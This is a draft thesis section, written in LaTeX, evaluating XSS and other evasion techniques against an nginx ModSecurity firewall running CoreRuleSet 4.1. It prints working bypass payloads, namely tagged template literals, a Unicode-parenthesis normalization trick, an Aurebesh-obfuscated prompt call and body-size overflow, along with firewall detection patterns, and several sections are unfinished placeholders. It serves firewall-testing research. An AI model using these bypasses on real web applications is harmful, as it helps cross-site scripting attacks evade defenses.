\subsection{Single Iteration Evaluation}
\label{sec:singleiterationeva}
This chapter states the evaluation results of a single iteration of application of an evasion technique to the specified payloads. If a considerable (from the perspective of the author of this work) bypass was found, the result will be detailed. Evaluation results of blocked requests are not further investigated.


\subsubsection{Payload length}
\label{sec:paylensingleiter}
As stated in Listing~\ref{lst:alertXSSblocked}, the payload \verb|alert('XSS')| is being blocked by the tested firewall:

\begin{lstlisting}[style=ruleStyle, language=XML, caption=alert('XSS'), label={lst:alertXSSblocked}]
<payload>alert('XSS')</payload>
<message>"Javascript method detected"</message>
<file>"rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf"</file>
<fileDetails>[line "714"] [id "941390"]<fileDetails>
<MatchedData>"alert("</MatchedData>
\end{lstlisting}

Filling the request with filler data in the form: \\
\verb|/**aa..a**/alert('XSS')| \\
will cause the request to be blocked by ModSecurity without matching on any CoreRuleSet rule:

\begin{lstlisting}[style=ruleStyle, language=XML, caption=request body bigger than maximum, label={lst:requesttoobig}]
<payload>/**aaa...(131052 more a)**/alert('XSS')</payload>
<message>"Failed to parse request body."</message>
<file>"/nginx/modsecurity.d/modsecurity.conf"</file>
<fileDetails>[line "76"] [id "200002"]<fileDetails>
<MatchedData>"Request body excluding files is bigger than the maximum expected."</MatchedData>
\end{lstlisting}

It takes exactly 131073 1-byte characters to reach this limit. If one less character is used in the request body, the ModSecurity firewall will match on \verb|alert(|, like in Listing~\ref{lst:alertXSSblocked}. This corresponds to the 131072 limit with rejection by default on exceeding the limit stated in the ModSecurity configuration file.


\subsubsection{Unicode encoding in JSON}
\label{sec:unicodeinjsontest}
The ModSecurity firewall detects and blocks requests containing \verb|${| followed by a closing \verb|}| after an arbitrary number of characters in between.
Tests have shown that using Unicode encoding in JSON and substituting the \verb|$| in a JSON request with \verb|\u0024| evades the previously mentioned detection, but triggers another firewall rule: \\
\verb|Possible Unicode character bypass detected|:

\begin{lstlisting}[style=ruleStyle, language=XML, caption=unicode tests \$\{`alert`\}, label={lst:jsonunicodetests}]
<payload>${`alert`}</payload>
<message>"Remote Command Execution: Unix Shell Expression Found"</message>
<file>"/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf"</file>
<fileDetails>[line "291"] [id "932130"]<fileDetails>
<MatchedData>"${`alert`}"</MatchedData>

<payload>\u0024{alert`}</payload>
<message>"Possible Unicode character bypass detected"</message>
<file>"/rules/REQUEST-920-PROTOCOL-ENFORCEMENT.conf"</file>
<fileDetails>[line "1263"] [id "920540"]<fileDetails>
<MatchedData>"x5cu0024"</MatchedData>
\end{lstlisting}

\subsubsection{Unicode Normalization}
\label{sec:uninormsingleiter}
The following payload using the function \verb|alert()| is being blocked by the ModSecurity Firewall:

\begin{lstlisting}[style=ruleStyle, language=XML, caption=alert("normalizeMe") blocked, label=lst:alertnormalizemeblocked]
<payload>alert("normalizeMe")</payload>
<file>"/rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf"</file>
<fileDetails>[line "714"] [id "941390"]<fileDetails>
<MatchedData>"alert("</MatchedData>
<message>"Javascript method detected"</message>
\end{lstlisting}

If the opening \verb|(| is substituted with the "Superscript Left Parenthesis" (U+207D), the payload bypasses the filter:

\begin{lstlisting}[style=basicStyle, caption=alert('normalizeMe') bypass, label=lst:alertnormalizemebypass]
alert\u{207D}'normalizeMe')
\end{lstlisting}

Calling \verb|.normalize('NFKD')| on the bypassed string:

\begin{lstlisting}[style=basicStyle]
"alert\u{207D}'normalizeMe')".normalize('NFKD')
\end{lstlisting}

will convert the string to the original payload:

\begin{lstlisting}[style=basicStyle]
"alert('normalizeMe')"
\end{lstlisting}

As such, this payload would be a valid bypass on web applications that normalize payloads on incoming requests using the NFKD or another normalization algorith that normalizes the payload equally. 


\subsubsection{Case Alternation}
\label{sec:casealternationevaluation}
As seen in Listing~\ref{lst:alertXSSblocked}, the payload \verb|alert('XSS')| is being blocked. Similarly, the payload \verb|aLeRT('XSS')| is being blocked by the ModSecurity Firewall using CRS4.1.:

\begin{lstlisting}[style=ruleStyle, language=XML, caption=alert("normalizeMe") blocked, label=lst:alertcasealternationblocked]
<payload>aLeRT('XSS')</payload>
<file>"/rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf"</file>
<fileDetails>[line "714"] [id "941390"]<fileDetails>
<MatchedData>"aLeRT("</MatchedData>
<message>"Javascript method detected"</message>
\end{lstlisting}

The specific warning that the firewall writes to its log on blocking the case-alternated payload gives a reason as to why the payload is being filtered:
\begin{lstlisting}[style=basicStyle, caption=ModSecurity warning on case alternated payloads, label={lst:modsecwarning}]
	ModSecurity: Warning. Matched "Operator `Rx' with parameter `(?i)\b(?:eval|set(?:timeout|interval)|new[\s\x0b]+Function|a(?:lert|tob)|btoa|prompt|confirm)[\s\x0b]*\('
\end{lstlisting}
The \verb|(?i)| regex modifier at the beginning of the rule instructs the regex engine to ignore case.


\subsubsection{Comment Interference}
{\color{red}TODO XSS comment interference}
% The example given by Ally Petitt \cite{medium/allypetitt} in Section~\ref{sec:commint} has been tested against the ModSecurity Firewall using CRS4.1. The original payload: \verb|?id=1+union+select+1,2,3--| is being blocked by the firewall:
%
% \begin{lstlisting}[style=ruleStyle, language=XML, caption=union select injection blocked, label=lst:sqliblocked]
% <payload>?id=1+union+select+1,2,3--</payload>
%
% <file>"/rules/REQUEST-942-APPLICATION-ATTACK-SQLI.conf"</file>
% <fileDetails>[line "205"] [id "942190"]<fileDetails>
% <MatchedData>"union select"</MatchedData>
% <message>"Detects MSSQL code execution and information gathering attempts"</message>
%
% <file>"/rules/REQUEST-942-APPLICATION-ATTACK-SQLI.conf"</file>
% <fileDetails>[line "469"] [id "942360"]<fileDetails>
% <MatchedData>"1 union select"</MatchedData>
% <message>"Detects concatenated basic SQL injection and SQLLFI attempts"</message>
% \end{lstlisting}
%
% Similarly, the modified payload using Comment Interference: \verb|?id=1+un/**/ion+sel/**/ect+1,2,3--| is detected and blocked:
%
% \begin{lstlisting}[style=ruleStyle, language=XML, caption=Comment Interference in SQL blocked, label=lst:commentinterferenceinsqlblocked]
% <payload>?id=1+un/**/ion+sel/**/ect+1,2,3--</payload>
% <file>"/rules/REQUEST-942-APPLICATION-ATTACK-SQLI.conf"</file>
% <fileDetails>[line "205"] [id "942190"]<fileDetails>
% <MatchedData>"union select"</MatchedData>
% <message>"Detects MSSQL code execution and information gathering attempts"</message>
% \end{lstlisting}
%
% The fact that the ModSecurity Firewall using CRS4.1 blocks this specifically crafted payload does not proof that using Comment Interference will never make payloads bypass the firewall. No more research was conducted into this idea, therefore Comment Interference is not being considered when crafting bypassing payloads in multiple steps in the following section.
%

\subsubsection{Percent Encoding}
The ModSecurity firewall detects some percent-encoded payloads. Requests with plain as well as percent-encoded payloads were sent to the reverse proxy. All requests triggered the same rules:

\begin{lstlisting}[style=ruleStyle, language=XML, caption=url encoded example blocked, label={lst:urlencodedexampleblocked}]
<payload>alert(`${new Date()}`)</payload>
<payload>urllib.parse.quote('alert(`${new Date()}`)')</payload>
<payload>'alert%28%60%24%7Bnew%20Date%28%29%7D%60%29'</payload>
<message>"Remote Command Execution: Unix Shell Expression Found"</message>
<file>"/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf"</file>
<fileDetails>[line "291"] [id "932130"]<fileDetails>
<MatchedData>"${new date()}"</MatchedData>

<message>"Javascript method detected"</message>
<file>"/rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf"</file>
<fileDetails>[line "714"] [id "941390"]<fileDetails>
<MatchedData>"alert("</MatchedData>
\end{lstlisting}

Many rules that are delivered as part of the CoreRuleSet in version 4.1 use the \verb|t:urlDecode| or \verb|t:urlDecodeUni| transformations that transform a filtered request by url decoding input strings before checking for rule matches. Therefore, using percent (url) encoding to try and bypass a firewall equipped with rules from CRS4.1 is considered futile.


\subsubsection{Charset Alternation}
{\color{red}TODO }

\subsubsection{HTML character references}
\label{sec:htmlcharrefsingleeva}
{\color{red}TODO }

\subsubsection{Function Constructor}
\label{sec:functionconstructorsingleeva}
{\color{red}TODO also: mention global objects here \cite{js/builtin}}

\subsubsection{Tagged Template Literals}
\label{sec:taggedtemplateliteralsevaluation}
As stated in Listing~\ref{lst:alertXSSblocked}, the payload \verb|alert('XSS')| is being blocked by the tested firewall.
After substituting the function call using \verb|('XSS')| with a Tagged Template Literal in the form of \verb|alert`XSS`|, the payload successfully bypasses the firewall and reaches the web server: 

\begin{lstlisting}[style=ruleStyle, language=XML, caption=alert`XSS` bypass, label=lst:alertXSSbypass]
<payload>alert("XSS")</payload>
<bypass>alert`XSS`</bypass>
\end{lstlisting}

{\color{red} hier evtl noch etwas mehr...}

\subsubsection{eval() function}
The ModSecurity firewall using CRS 4.1.0. checks for usage of the function \verb|eval()| and tries to block requests containing it. An example is listed in Listing~\ref{lst:evalalertXSSblocked}.
{\color{red} hier evtl noch etwas mehr...}

\begin{lstlisting}[style=ruleStyle, language=XML, caption=eval(`al` + `e` + `rt('XSS')`) blocking example, label={lst:evalalertXSSblocked}]
<payload>eval(`al` + `e` + `rt('XSS')`)</payload>
<file>"rules/REQUEST-933-APPLICATION-ATTACK-PHP.conf"</file>
<fileDetails>[line "331"] [id "933160"]<fileDetails>
<MatchedData>"eval(`al`   `e`   `rt('XSS')"</MatchedData>

<file>"rules/REQUEST-934-APPLICATION-ATTACK-GENERIC.conf"</file>
<fileDetails>[line "52"] [id "934100"]<fileDetails>
<MatchedData>"eval("</MatchedData>

<file>"rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf"</file>
<fileDetails>[line "714"] [id "941390"]<fileDetails>
<MatchedData>"eval("</MatchedData>
\end{lstlisting}

\subsubsection{JSFuck}
The payload \verb|alert('XSS')| has been sent to the Web Application and blocked (Listing~\ref{lst:alertXSSblocked}). Subsequently the payload was obscured using the service provided by JSFuck: https://jsfuck.com/ \\
The resulting payload is shown in Listing~\ref{lst:alertxssjsfuck}. The ModSecurity firewall using CRS 4.1 detects the JSFuck "encoding" and blocks the payload:

\begin{lstlisting}[style=ruleStyle, language=XML, caption=alert('XSS') in JSFuck blocked, label={lst:alertxssjsfuckblocked}]
<payload>^(Listing~\ref{lst:alertxssjsfuck})^</payload>
<message>"JSFuck / Hieroglyphy obfuscation detected"</message>
<file>"rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf"</file>
<fileDetails>[line "654"] [id "941360"]<fileDetails>
<MatchedData>
"Suspicious payload found within ARGS_NAMES:[][(![] [])[ []] (![] [])[! [] ! []] (![] [])[ ! []] (!![] [])[ []]][([][(![] [])[ []] (![] [])[! [] ! []] (![] [])[ ! []] (!![] [])[ []]] [])[ (11337 characters omitted)"
</MatchedData>
<message>"Javascript method detected"</message>
<file>"/rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf"</file>
<fileDetails>[line "714"] [id "941390"]<fileDetails>
<MatchedData>"alert("</MatchedData>
\end{lstlisting}


\subsubsection{Aurebesh.js}
\label{sec:aurebeshevaluation}
When sending the payload \verb|prompt()|, the ModSecurity firewall using CRS 4.1 detects the \gls{xss} attempt and blocks the request:
\begin{lstlisting}[style=ruleStyle, language=XML, caption=prompt(1\,2) blocked, label=lst:promptblocked]
<payload>prompt(1,2)</payload>
<file>"rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf"</file>
<fileDetails>[line "714"] [id "941390"]<fileDetails>
<MatchedData>"prompt("</MatchedData>
\end{lstlisting}
If the Aurebesh technique is used to substitute most of the payload with the characters \verb|A-I| as well as \verb|() + [] ! ' = {}|, the obscured payload bypasses the firewall:
\begin{lstlisting}[style=ruleStyle, language=XML, caption=Aurebesh prompt bypass, label=lst:aurebeshpromptbypass]
<payload>prompt(1,2)</payload>
<bypass>A='',B=!A+A,C=!B+A,D=A+{},E=B[A++],F=B[G=A],H=++G+A,I=D[G+H],B[I+=D[A]+(B.C+D)[A]+C[H]+E+F+B[G]+I+E+D[A]+F][I]('p'+F+D[A]+'m'+'p'+E+'(A,++A)')()</bypass>
\end{lstlisting}

For an explanation on how the payload mentioned in Listing~\ref{lst:aurebeshpromptbypass} was created, see Section~\ref{sec:aurebesh}.

The aurebesh evaluation concludes the single iteration evaluation. In the following subsection, payloads obscured through multiple iterations will be evaluated against the tested firewall configuration of an nginx reverse proxy using ModSecurity equipped with rules from the CoreRuleSet version 4.1.


